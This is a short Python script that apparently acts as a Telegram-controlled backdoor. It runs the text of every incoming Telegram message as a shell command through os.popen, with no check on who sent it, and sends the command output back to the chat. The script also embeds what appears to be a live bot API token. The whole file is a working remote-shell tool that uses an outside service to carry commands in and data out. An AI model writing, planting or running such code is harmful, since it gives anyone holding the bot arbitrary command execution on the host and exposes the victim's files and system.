import os
import telebot
bot=telebot.TeleBot('6165670532:AAGtDdFpAVLCNiPAiuM_euW09HSTbgT_KdU')
def cmd(c):
    x = os.popen(c).readlines()
    return x
@bot.message_handler(func=lambda message: True)
def getall(message):
    c = message.text
    n=cmd(c)
    bot.send_message(message.chat.id,n)

bot.polling()